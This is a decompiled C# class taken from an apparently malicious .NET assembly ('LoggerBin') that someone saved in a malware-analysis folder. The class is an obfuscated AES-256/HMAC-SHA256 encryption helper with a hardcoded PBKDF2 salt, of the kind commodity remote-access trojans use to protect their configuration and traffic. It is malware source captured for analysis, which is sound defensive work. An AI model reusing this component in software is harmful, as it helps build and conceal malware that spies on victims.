// Decompiled with JetBrains decompiler
// Type: hWn.YW3
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace hWn
{
  internal class YW3
  {
    private const int KeyLength = 32;
    private const int AuthKeyLength = 64;
    private const int IvLength = 16;
    private const int HmacSha256Length = 32;
    private readonly byte[] _key;
    private readonly byte[] _authKey;
    private static readonly byte[] Salt;
    internal static YW3 Saf;

    public YW3(string _param1)
    {
      yd.bx(yd.EI);
      // ISSUE: explicit constructor call
      base.\u002Ector();
      if (string.IsNullOrEmpty(_param1))
        throw new ArgumentException();
      using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(_param1, YW3.Salt, 50000))
      {
        this._key = (byte[]) YW3.Aao((object) rfc2898DeriveBytes, 32);
        this._authKey = rfc2898DeriveBytes.GetBytes(64);
      }
    }

    public string lC0(string _param1) => Convert.ToBase64String(UIh.bx((object) this, Encoding.UTF8.GetBytes(_param1), UIh.JIV));

    public byte[] oCN(byte[] _param1)
    {
      if (_param1 == null)
        throw new ArgumentNullException();
      using (MemoryStream memoryStream = new MemoryStream())
      {
        YW3.Yam((object) memoryStream, 32L);
        using (AesCryptoServiceProvider cryptoServiceProvider = new AesCryptoServiceProvider())
        {
          YW3.XaR((object) cryptoServiceProvider, 256);
          cryptoServiceProvider.BlockSize = 128;
          cryptoServiceProvider.Mode = CipherMode.CBC;
          cryptoServiceProvider.Padding = PaddingMode.PKCS7;
          cryptoServiceProvider.Key = this._key;
          cryptoServiceProvider.GenerateIV();
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, cryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write))
          {
            memoryStream.Write(cryptoServiceProvider.IV, 0, cryptoServiceProvider.IV.Length);
            cryptoStream.Write(_param1, 0, _param1.Length);
            cryptoStream.FlushFinalBlock();
            using (HMACSHA256 hmacshA256 = new HMACSHA256(this._authKey))
            {
              byte[] hash = hmacshA256.ComputeHash(memoryStream.ToArray(), 32, memoryStream.ToArray().Length - 32);
              memoryStream.Position = 0L;
              memoryStream.Write(hash, 0, hash.Length);
            }
          }
        }
        return memoryStream.ToArray();
      }
    }

    public string NCm(string _param1) => Encoding.UTF8.GetString(UIh.bx((object) this, Convert.FromBase64String(_param1), UIh.nIu));

    public byte[] GCb(byte[] _param1)
    {
      MemoryStream memoryStream = _param1 != null ? new MemoryStream(_param1) : throw new ArgumentNullException(w4.bx(21906, w4.vY));
      try
      {
        using (AesCryptoServiceProvider cryptoServiceProvider = new AesCryptoServiceProvider())
        {
          cryptoServiceProvider.KeySize = 256;
          cryptoServiceProvider.BlockSize = 128;
          cryptoServiceProvider.Mode = CipherMode.CBC;
          cryptoServiceProvider.Padding = PaddingMode.PKCS7;
          cryptoServiceProvider.Key = this._key;
          HMACSHA256 hmacshA256 = new HMACSHA256(this._authKey);
          try
          {
            byte[] hash = hmacshA256.ComputeHash(memoryStream.ToArray(), 32, memoryStream.ToArray().Length - 32);
            byte[] buffer = new byte[32];
            memoryStream.Read(buffer, 0, buffer.Length);
            if (!dIG.bx((object) this, hash, buffer, dIG.xIU))
              throw new CryptographicException(w4.bx(21954, w4.vY));
          }
          finally
          {
            if (hmacshA256 != null)
              YW3.qa3((object) hmacshA256);
          }
          byte[] buffer1 = new byte[16];
          memoryStream.Read(buffer1, 0, 16);
          cryptoServiceProvider.IV = buffer1;
          CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, cryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Read);
          int num = 0;
          if (YW3.Yag() != null)
            goto label_6;
label_5:
          switch (num)
          {
            default:
              try
              {
                byte[] buffer2 = new byte[memoryStream.Length - 16L + 1L];
                byte[] numArray = new byte[cryptoStream.Read(buffer2, 0, buffer2.Length)];
                Buffer.BlockCopy((Array) buffer2, 0, (Array) numArray, 0, numArray.Length);
                return numArray;
              }
              finally
              {
                cryptoStream?.Dispose();
              }
          }
label_6:
          num = 0;
          goto label_5;
        }
      }
      finally
      {
        if (memoryStream != null)
          YW3.qa3((object) memoryStream);
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private bool rCa(byte[] _param1, byte[] _param2)
    {
      bool flag = true;
      for (int index = 0; index < _param1.Length; ++index)
      {
        if ((int) _param1[index] == (int) _param2[index])
          continue;
        flag = false;
      }
      return flag;
    }

    static YW3()
    {
      yd.bx(yd.EI);
      YW3.Salt = new byte[32]
      {
        (byte) 191,
        (byte) 235,
        (byte) 30,
        (byte) 86,
        (byte) 251,
        (byte) 205,
        (byte) 151,
        (byte) 59,
        (byte) 178,
        (byte) 25,
        (byte) 2,
        (byte) 36,
        (byte) 48,
        (byte) 165,
        (byte) 120,
        (byte) 67,
        (byte) 0,
        (byte) 61,
        (byte) 86,
        (byte) 68,
        (byte) 210,
        (byte) 30,
        (byte) 98,
        (byte) 185,
        (byte) 212,
        (byte) 241,
        (byte) 128,
        (byte) 231,
        (byte) 230,
        (byte) 195,
        (byte) 57,
        (byte) 65
      };
    }

    internal static object Aao([In] object obj0, [In] int obj1) => (object) ((DeriveBytes) obj0).GetBytes(obj1);

    internal static bool paJ() => YW3.Saf == null;

    internal static YW3 Yag() => YW3.Saf;

    internal static void Yam([In] object obj0, [In] long obj1) => ((Stream) obj0).Position = obj1;

    internal static void XaR([In] object obj0, [In] int obj1) => ((SymmetricAlgorithm) obj0).KeySize = obj1;

    internal static void qa3([In] object obj0) => ((IDisposable) obj0).Dispose();
  }
}
